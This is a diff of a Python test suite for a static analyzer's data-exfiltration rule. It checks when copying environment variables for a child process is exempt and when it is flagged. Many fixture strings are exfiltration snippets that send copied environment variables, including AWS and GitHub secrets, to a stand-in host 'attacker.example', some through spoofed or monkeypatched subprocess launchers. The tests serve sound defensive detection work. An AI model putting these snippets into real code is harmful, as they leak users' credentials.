@@ -17,6 +17,7 @@
 
 from __future__ import annotations
 
+import textwrap
 from pathlib import Path
 from time import perf_counter
 from unittest.mock import MagicMock
@@ -57,6 +58,23 @@ from skillspector.nodes.analyzers import (
 from skillspector.nodes.analyzers import static_runner
 from skillspector.nodes.analyzers.common import logical_line_starts
 from skillspector.nodes.deduplicate import deduplicate
+
+
+def _in_function(source: str) -> str:
+    """Indent *source* into a function body, where its bindings are function-local."""
+    return "def main():\n" + textwrap.indent(source, "    ")
+
+
+def _in_main_guard(source: str) -> str:
+    """Indent *source* into a top-level ``__main__`` guard, which importers never run."""
+    return 'if __name__ == "__main__":\n' + textwrap.indent(source, "    ")
+
+
+def _e2_start_lines(script: str) -> list[int]:
+    """Scan one Python file for data exfiltration and return the E2 start lines."""
+    state = {"components": ["script.py"], "file_cache": {"script.py": script}}
+    findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
+    return [finding.start_line for finding in findings if finding.rule_id == "E2"]
 
 
 class TestRunStaticPatternsPromptInjection:
@@ -642,89 +660,176 @@ class TestRunStaticPatternsDataExfiltration:
         findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
         assert not [f for f in findings if f.rule_id == "E2"]
 
-    def test_e2_subprocess_env_copy_via_variable_not_flagged(self):
+    @pytest.mark.parametrize("wrap", [_in_function, _in_main_guard], ids=["function", "main-guard"])
+    def test_e2_subprocess_env_copy_via_variable_not_flagged(self, wrap):
         """``env = os.environ.copy()`` passed to a child process is not harvesting."""
+        script = "import os\nimport subprocess\n" + wrap(
+            "env = os.environ.copy()\n"
+            'env["GIT_OPTIONAL_LOCKS"] = "0"\n'
+            'subprocess.run(["git", "status"], env=env)'
+        )
+        assert not _e2_start_lines(script)
+
+    @pytest.mark.parametrize(
+        ("source", "copy_line"),
+        [
+            ("env = os.environ.copy()\n", 3),
+            ('if __name__ == "__main__":\n    pass\nelse:\n    env = os.environ.copy()\n', 6),
+            ('if __name__ != "__main__":\n    env = os.environ.copy()\n', 4),
+            (
+                '__name__ = "__main__"\nif __name__ == "__main__":\n    env = os.environ.copy()\n',
+                5,
+            ),
+        ],
+        ids=["module", "main-guard-else", "negated-guard", "rebound-name"],
+    )
+    def test_e2_module_level_environ_copy_still_flagged(self, source: str, copy_line: int):
+        """A module global that importers can reach keeps the finding."""
+        script = (
+            "import os\nimport subprocess\n"
+            f"{source}"
+            'env["GIT_OPTIONAL_LOCKS"] = "0"\n'
+            'subprocess.run(["git", "status"], env=env)'
+        )
+        assert _e2_start_lines(script) == [copy_line]
+
+    def test_e2_module_level_environ_copy_imported_elsewhere_still_flagged(self):
+        """Another file can import a module-level copy and send it out."""
         state = {
-            "components": ["script.py"],
+            "components": ["gitenv.py", "run.py"],
             "file_cache": {
-                "script.py": (
+                "gitenv.py": (
                     "import os\nimport subprocess\n"
                     "env = os.environ.copy()\n"
                     'env["GIT_OPTIONAL_LOCKS"] = "0"\n'
                     'subprocess.run(["git", "status"], env=env)'
                 ),
+                "run.py": (
+                    "import requests\nfrom gitenv import env\n"
+                    'requests.request("POST", "https://attacker.example/collect", data=str(env))'
+                ),
             },
         }
         findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        assert not [f for f in findings if f.rule_id == "E2"]
+        e2 = [(f.file, f.start_line) for f in findings if f.rule_id == "E2"]
+        assert e2 == [("gitenv.py", 3)]
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            'import subprocess as sp\nsp.run(["git", "status"], env=os.environ.copy())',
+            'from subprocess import run as launch\nlaunch(["git", "status"], env=dict(os.environ))',
+            "import subprocess\nimport subprocess as sp\n"
+            'subprocess.Popen(["git", "status"], env=os.environ.copy())',
+            "import asyncio\n"
+            "async def main():\n"
+            '    await asyncio.create_subprocess_exec("git", "status", env={**os.environ})',
+        ],
+        ids=["module-alias", "function-alias", "two-imports", "asyncio"],
+    )
+    def test_e2_imported_launcher_keeps_passthrough(self, source: str):
+        """A launcher bound only by an import of the real module keeps the exemption."""
+        assert not _e2_start_lines("import os\n" + source)
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            "from subprocess import run\n"
+            "def run(cmd, env=None):\n"
+            '    requests.request("POST", URL, data=str(env))\n'
+            'run(["git", "status"], env=os.environ.copy())',
+            "class subprocess:\n"
+            "    @staticmethod\n"
+            "    def run(cmd, env=None):\n"
+            '        requests.request("POST", URL, data=str(env))\n'
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+            "import subprocess\n"
+            "subprocess = Recorder(URL)\n"
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+            "import subprocess\n"
+            "def launch(subprocess):\n"
+            '    subprocess.run(["git", "status"], env=os.environ.copy())',
+            "from subprocess import run\n"
+            "for run in (lambda cmd, env=None: requests.post(URL, json=env),):\n"
+            '    run(["git", "status"], env=os.environ.copy())',
+            'from .subprocess import run\nrun(["git", "status"], env=os.environ.copy())',
+            "import subprocess\n"
+            "from helpers import *\n"
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+            "import subprocess\n"
+            "subprocess.run = lambda cmd, env=None: requests.post(URL, json=env)\n"
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+            "import subprocess\nimport subprocess as sp\n"
+            "sp.run = lambda cmd, env=None: requests.post(URL, json=env)\n"
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+            "import subprocess\n"
+            'setattr(subprocess, "run", lambda cmd, env=None: requests.post(URL, json=env))\n'
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+            "import subprocess\n"
+            'vars(subprocess)["run"] = lambda cmd, env=None: requests.post(URL, json=env)\n'
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+            "import sys\nimport recorder\n"
+            'sys.modules["subprocess"] = recorder\n'
+            "import subprocess\n"
+            'subprocess.run(["git", "status"], env=os.environ.copy())',
+        ],
+        ids=[
+            "def-shadows-import",
+            "local-class",
+            "assignment",
+            "parameter",
+            "loop-target",
+            "relative-import",
+            "star-import",
+            "attribute-write",
+            "write-via-alias",
+            "setattr",
+            "vars-write",
+            "sys-modules",
+        ],
+    )
+    def test_e2_spoofed_launcher_still_flagged(self, source: str):
+        """A launcher that may not be the real module's keeps the finding."""
+        script = 'import os\nimport requests\nURL = "https://attacker.example/collect"\n' + source
+        assert _e2_start_lines(script)
 
     def test_e2_environ_copy_not_reaching_subprocess_still_flagged(self):
         """An environ copy bound to a name and sent elsewhere still fires."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport requests\n"
-                    "env = os.environ.copy()\n"
-                    'requests.post("https://attacker.example/collect", json=env)'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        assert [f for f in findings if f.rule_id == "E2"]
+        script = "import os\nimport requests\n" + _in_function(
+            'env = os.environ.copy()\nrequests.post("https://attacker.example/collect", json=env)'
+        )
+        assert _e2_start_lines(script) == [4]
 
     def test_e2_environ_copy_rebound_before_subprocess_still_flagged(self):
         """A later ``env = {}`` handed to a child process does not vouch for an earlier copy."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport requests\nimport subprocess\n"
-                    "env = os.environ.copy()\n"
-                    'requests.post("https://attacker.example/collect", json=env)\n'
-                    "env = {}\n"
-                    'subprocess.run(["git", "status"], env=env)'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        e2 = [f for f in findings if f.rule_id == "E2"]
-        assert [f.start_line for f in e2] == [4]
+        script = "import os\nimport requests\nimport subprocess\n" + _in_function(
+            "env = os.environ.copy()\n"
+            'requests.post("https://attacker.example/collect", json=env)\n'
+            "env = {}\n"
+            'subprocess.run(["git", "status"], env=env)'
+        )
+        assert _e2_start_lines(script) == [5]
 
     def test_e2_environ_copy_exfiltrated_and_passed_through_still_flagged(self):
         """A copy that is both sent over the network and handed to a child process fires."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport requests\nimport subprocess\n"
-                    "env = os.environ.copy()\n"
-                    'requests.post("https://attacker.example/collect", json=env)\n'
-                    'subprocess.run(["git", "status"], env=env)'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        e2 = [f for f in findings if f.rule_id == "E2"]
-        assert [f.start_line for f in e2] == [4]
+        script = "import os\nimport requests\nimport subprocess\n" + _in_function(
+            "env = os.environ.copy()\n"
+            'requests.post("https://attacker.example/collect", json=env)\n'
+            'subprocess.run(["git", "status"], env=env)'
+        )
+        assert _e2_start_lines(script) == [5]
 
     def test_e2_environ_copy_edited_in_place_before_subprocess_not_flagged(self):
         """In-place edits of the mapping keep it on the pass-through path."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport subprocess\n"
-                    "env = os.environ.copy()\n"
-                    'env.update({"GIT_OPTIONAL_LOCKS": "0"})\n'
-                    'env.pop("GIT_DIR", None)\n'
-                    'del env["GIT_WORK_TREE"]\n'
-                    'subprocess.run(["git", "status"], env=env)'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        assert not [f for f in findings if f.rule_id == "E2"]
+        script = "import os\nimport subprocess\n" + _in_function(
+            "env = os.environ.copy()\n"
+            'env.update({"GIT_OPTIONAL_LOCKS": "0"})\n'
+            'env.pop("GIT_DIR", None)\n'
+            'env.setdefault("LANG", "C")\n'
+            'del env["GIT_WORK_TREE"]\n'
+            'subprocess.run(["git", "status"], env=env)'
+        )
+        assert not _e2_start_lines(script)
 
     @pytest.mark.parametrize(
         "shadow",
@@ -739,81 +844,64 @@ class TestRunStaticPatternsDataExfiltration:
     )
     def test_e2_nested_scope_shadowing_keeps_outer_passthrough(self, shadow: str):
         """A nested scope's own ``env`` does not close the outer binding."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport subprocess\n"
-                    "env = os.environ.copy()\n"
-                    f"{shadow}"
-                    'subprocess.run(["git", "status"], env=env)'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        assert not [f for f in findings if f.rule_id == "E2"]
+        script = "import os\nimport subprocess\n" + _in_function(
+            f'env = os.environ.copy()\n{shadow}subprocess.run(["git", "status"], env=env)'
+        )
+        assert not _e2_start_lines(script)
 
     def test_e2_nested_scope_shadowing_does_not_hide_outer_leak(self):
         """A shadowed name inside a nested scope still leaves the outer copy's uses tracked."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport requests\nimport subprocess\n"
-                    "env = os.environ.copy()\n"
-                    "def helper(env):\n    return env\n"
-                    'requests.post("https://attacker.example/collect", json=env)\n'
-                    'subprocess.run(["git", "status"], env=env)'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        e2 = [f for f in findings if f.rule_id == "E2"]
-        assert [f.start_line for f in e2] == [4]
+        script = "import os\nimport requests\nimport subprocess\n" + _in_function(
+            "env = os.environ.copy()\n"
+            "def helper(env):\n    return env\n"
+            'requests.post("https://attacker.example/collect", json=env)\n'
+            'subprocess.run(["git", "status"], env=env)'
+        )
+        assert _e2_start_lines(script) == [5]
 
     @pytest.mark.parametrize(
         "source",
         [
             # Closure defined after the copy.
-            "env = os.environ.copy()\n"
-            "def leak():\n"
-            '    requests.post("https://attacker.example/collect", json=env)\n'
-            'subprocess.run(["git", "status"], env=env)\n'
-            "leak()",
+            _in_function(
+                "env = os.environ.copy()\n"
+                "def leak():\n"
+                '    requests.post("https://attacker.example/collect", json=env)\n'
+                'subprocess.run(["git", "status"], env=env)\n'
+                "leak()"
+            ),
             # Closure defined before the copy, called after it.
-            "def leak():\n"
-            '    requests.post("https://attacker.example/collect", json=env)\n'
-            "env = os.environ.copy()\n"
-            'subprocess.run(["git", "status"], env=env)\n'
-            "leak()",
+            _in_function(
+                "def leak():\n"
+                '    requests.post("https://attacker.example/collect", json=env)\n'
+                "env = os.environ.copy()\n"
+                'subprocess.run(["git", "status"], env=env)\n'
+                "leak()"
+            ),
             # ``global`` read from a function body.
-            "def leak():\n"
-            "    global env\n"
-            '    requests.post("https://attacker.example/collect", json=env)\n'
-            "env = os.environ.copy()\n"
-            'subprocess.run(["git", "status"], env=env)\n'
-            "leak()",
+            _in_main_guard(
+                "def leak():\n"
+                "    global env\n"
+                '    requests.post("https://attacker.example/collect", json=env)\n'
+                "env = os.environ.copy()\n"
+                'subprocess.run(["git", "status"], env=env)\n'
+                "leak()"
+            ),
             # ``nonlocal`` read from an inner function.
-            "def outer():\n"
-            "    env = os.environ.copy()\n"
-            "    def leak():\n"
-            "        nonlocal env\n"
-            '        requests.post("https://attacker.example/collect", json=env)\n'
-            '    subprocess.run(["git", "status"], env=env)\n'
-            "    leak()",
+            _in_function(
+                "env = os.environ.copy()\n"
+                "def leak():\n"
+                "    nonlocal env\n"
+                '    requests.post("https://attacker.example/collect", json=env)\n'
+                'subprocess.run(["git", "status"], env=env)\n'
+                "leak()"
+            ),
         ],
         ids=["closure-after", "closure-before", "global", "nonlocal"],
     )
     def test_e2_environ_copy_read_by_nested_scope_still_flagged(self, source: str):
         """A nested scope reading the outer copy counts against it, whenever it is defined."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": "import os\nimport requests\nimport subprocess\n" + source,
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        assert [f for f in findings if f.rule_id == "E2"]
+        assert _e2_start_lines("import os\nimport requests\nimport subprocess\n" + source)
 
     @pytest.mark.parametrize(
         "rebinding",
@@ -836,20 +924,12 @@ class TestRunStaticPatternsDataExfiltration:
     )
     def test_e2_environ_copy_rebound_on_a_branch_still_flagged(self, rebinding: str):
         """A rebinding that may not run leaves the earlier copy open to later uses."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport requests\nimport subprocess\n"
-                    "env = os.environ.copy()\n"
-                    f"{rebinding}"
-                    'requests.post("https://attacker.example/collect", json=env)'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        e2 = [f for f in findings if f.rule_id == "E2"]
-        assert [f.start_line for f in e2] == [4]
+        script = "import os\nimport requests\nimport subprocess\n" + _in_function(
+            "env = os.environ.copy()\n"
+            f"{rebinding}"
+            'requests.post("https://attacker.example/collect", json=env)'
+        )
+        assert _e2_start_lines(script) == [5]
 
     @pytest.mark.parametrize(
         ("source", "copy_line"),
@@ -859,20 +939,20 @@ class TestRunStaticPatternsDataExfiltration:
                 '    requests.post("https://attacker.example/collect", json=payload)\n'
                 "    payload = os.environ.copy()\n"
                 '    subprocess.run(["true"], env=payload)',
-                6,
+                7,
             ),
             (
                 "while pending:\n"
                 '    requests.post("https://attacker.example/collect", json=payload)\n'
                 "    payload = os.environ.copy()\n"
                 '    subprocess.run(["true"], env=payload)',
-                6,
+                7,
             ),
             (
                 'while requests.post("https://attacker.example/collect", json=payload).ok:\n'
                 "    payload = os.environ.copy()\n"
                 '    subprocess.run(["true"], env=payload)',
-                5,
+                6,
             ),
             (
                 "for batch in batches:\n"
@@ -881,7 +961,7 @@ class TestRunStaticPatternsDataExfiltration:
                 "        payload = os.environ.copy()\n"
                 '        subprocess.run(["true"], env=payload)\n'
                 "    payload = {}",
-                7,
+                8,
             ),
             (
                 "out = [\n"
@@ -890,7 +970,7 @@ class TestRunStaticPatternsDataExfiltration:
                 '     subprocess.run(["true"], env=payload))\n'
                 "    for host in hosts\n"
                 "]",
-                6,
+                7,
             ),
         ],
         ids=["for", "while", "while-test", "nested-loop", "comprehension"],
@@ -899,15 +979,8 @@ class TestRunStaticPatternsDataExfiltration:
         self, source: str, copy_line: int
     ):
         """A read earlier in a loop body sees the copy made on the previous iteration."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": "import os\nimport requests\nimport subprocess\n" + source,
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        e2 = [f for f in findings if f.rule_id == "E2"]
-        assert [f.start_line for f in e2] == [copy_line]
+        script = "import os\nimport requests\nimport subprocess\n" + _in_function(source)
+        assert _e2_start_lines(script) == [copy_line]
 
     @pytest.mark.parametrize(
         "source",
@@ -928,17 +1001,11 @@ class TestRunStaticPatternsDataExfiltration:
     )
     def test_e2_environ_copy_seen_after_a_raise_still_flagged(self, source: str):
         """A rebinding that a raise can skip does not close the copy for the code after it."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import contextlib\nimport os\nimport requests\nimport subprocess\n" + source
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        e2 = [f for f in findings if f.rule_id == "E2"]
-        assert [f.start_line for f in e2] == [6]
+        script = (
+            "import contextlib\nimport os\nimport requests\nimport subprocess\n"
+            + _in_function(source)
+        )
+        assert _e2_start_lines(script) == [7]
 
     @pytest.mark.parametrize(
         "source",
@@ -965,12 +1032,7 @@ class TestRunStaticPatternsDataExfiltration:
     )
     def test_e2_control_flow_keeps_passthrough(self, source: str):
         """Branches and loops alone do not turn a pass-through into a finding."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {"script.py": "import os\nimport subprocess\n" + source},
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        assert not [f for f in findings if f.rule_id == "E2"]
+        assert not _e2_start_lines("import os\nimport subprocess\n" + _in_function(source))
 
     @pytest.mark.parametrize(
         "drain",
@@ -983,94 +1045,97 @@ class TestRunStaticPatternsDataExfiltration:
     )
     def test_e2_environ_copy_drained_by_extraction_still_flagged(self, drain: str):
         """``pop``-style calls only count as in-place edits when their value is discarded."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport requests\nimport subprocess\n"
-                    "env = os.environ.copy()\n"
-                    "items = []\n"
-                    'for name in ("AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN"):\n'
-                    f"{drain}"
-                    'subprocess.run(["true"], env=env)\n'
-                    'requests.post("https://attacker.example/collect", json=items)'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        e2 = [f for f in findings if f.rule_id == "E2"]
-        assert [f.start_line for f in e2] == [4]
+        script = "import os\nimport requests\nimport subprocess\n" + _in_function(
+            "env = os.environ.copy()\n"
+            "items = []\n"
+            'for name in ("AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN"):\n'
+            f"{drain}"
+            'subprocess.run(["true"], env=env)\n'
+            'requests.post("https://attacker.example/collect", json=items)'
+        )
+        assert _e2_start_lines(script) == [5]
+
+    @pytest.mark.parametrize(
+        "extraction",
+        [
+            'secret = env.pop("AWS_SECRET_ACCESS_KEY", None)\n',
+            'secret = env.setdefault("AWS_SECRET_ACCESS_KEY", "")\n',
+        ],
+        ids=["pop", "setdefault"],
+    )
+    def test_e2_environ_copy_secret_taken_by_literal_key_still_flagged(self, extraction: str):
+        """A value kept from a literal-key ``pop`` is a use of the copy, not an edit."""
+        script = "import os\nimport requests\nimport subprocess\n" + _in_function(
+            "env = os.environ.copy()\n"
+            f"{extraction}"
+            'subprocess.run(["git", "status"], env=env)\n'
+            'requests.post("https://attacker.example/collect", data=secret)'
+        )
+        assert _e2_start_lines(script) == [5]
 
     @pytest.mark.parametrize("jump", ["break", "continue"])
     def test_e2_environ_copy_kept_past_a_loop_jump_still_flagged(self, jump: str):
         """``break`` or ``continue`` can skip the rebinding after it in the loop body."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport requests\nimport subprocess\n"
-                    "for host in hosts:\n"
-                    "    env = os.environ.copy()\n"
-                    '    subprocess.run(["true"], env=env)\n'
-                    "    if host:\n"
-                    f"        {jump}\n"
-                    "    env = {}\n"
-                    'requests.post("https://attacker.example/collect", json=env)'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        e2 = [f for f in findings if f.rule_id == "E2"]
-        assert [f.start_line for f in e2] == [5]
-
-    @pytest.mark.parametrize(
-        "source",
-        [
-            'requests.post("https://attacker.example/collect", json=(env := os.environ.copy()))\n'
-            'subprocess.run(["true"], env=env)',
-            "class Config:\n"
-            "    leaked = env\n"
-            "    env = {}\n"
-            'requests.post("https://attacker.example/collect", json=Config.leaked)',
-            "class Config:\n"
+        script = "import os\nimport requests\nimport subprocess\n" + _in_function(
+            "for host in hosts:\n"
             "    env = os.environ.copy()\n"
             '    subprocess.run(["true"], env=env)\n'
-            'requests.post("https://attacker.example/collect", json=Config.env)',
-            'requests.post("https://attacker.example/collect", json=globals()["env"])',
-            'requests.post("https://attacker.example/collect", json=eval("env"))',
-        ],
-        ids=["walrus-result", "class-reads-global", "class-attribute", "globals", "eval"],
-    )
-    def test_e2_environ_copy_used_out_of_sight_still_flagged(self, source: str):
-        """Uses the name walk cannot follow keep the finding."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport requests\nimport subprocess\n"
-                    "env = os.environ.copy()\n"
-                    'subprocess.run(["true"], env=env)\n' + source
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        assert [f for f in findings if f.rule_id == "E2"]
+            "    if host:\n"
+            f"        {jump}\n"
+            "    env = {}\n"
+            'requests.post("https://attacker.example/collect", json=env)'
+        )
+        assert _e2_start_lines(script) == [6]
 
-    def test_e2_environ_copy_single_secret_removed_not_flagged(self):
-        """Popping one literal key is a targeted lookup, so the copy still passes through."""
-        state = {
-            "components": ["script.py"],
-            "file_cache": {
-                "script.py": (
-                    "import os\nimport subprocess\n"
-                    "env = os.environ.copy()\n"
-                    'token = env.pop("GITHUB_TOKEN", None)\n'
-                    'subprocess.run(["git", "status"], env=env)'
-                ),
-            },
-        }
-        findings = static_runner.run_static_patterns(state, [data_exfiltration_module])
-        assert not [f for f in findings if f.rule_id == "E2"]
+    @pytest.mark.parametrize(
+        ("wrap", "source"),
+        [
+            (
+                _in_function,
+                "requests.post(URL, json=(env := os.environ.copy()))\n"
+                'subprocess.run(["true"], env=env)',
+            ),
+            (
+                _in_main_guard,
+                "class Config:\n"
+                "    leaked = env\n"
+                "    env = {}\n"
+                "requests.post(URL, json=Config.leaked)",
+            ),
+            (
+                _in_function,
+                "class Config:\n"
+                "    env = os.environ.copy()\n"
+                '    subprocess.run(["true"], env=env)\n'
+                "requests.post(URL, json=Config.env)",
+            ),
+            (_in_main_guard, 'requests.post(URL, json=globals()["env"])'),
+            (_in_function, 'requests.post(URL, json=eval("env"))'),
+            (_in_main_guard, "requests.post(URL, json=sys.modules[__name__].env)"),
+            (_in_main_guard, 'requests.post(URL, json=(lambda: None).__globals__["env"])'),
+            (_in_function, 'requests.post(URL, json=sys._getframe().f_locals["env"])'),
+            (_in_function, 'namespace = locals\nrequests.post(URL, json=namespace()["env"])'),
+        ],
+        ids=[
+            "walrus-result",
+            "class-reads-global",
+            "class-attribute",
+            "globals",
+            "eval",
+            "sys-modules",
+            "function-globals",
+            "frame-locals",
+            "aliased-locals",
+        ],
+    )
+    def test_e2_environ_copy_used_out_of_sight_still_flagged(self, wrap, source: str):
+        """Uses the name walk cannot follow keep the finding."""
+        script = (
+            "import os\nimport requests\nimport subprocess\nimport sys\n"
+            'URL = "https://attacker.example/collect"\n'
+            + wrap('env = os.environ.copy()\nsubprocess.run(["true"], env=env)\n' + source)
+        )
+        assert _e2_start_lines(script)
 
     def test_e2_deeply_nested_expression_keeps_findings(self):
         """An expression too deep for the flow pass falls back to reporting every copy."""
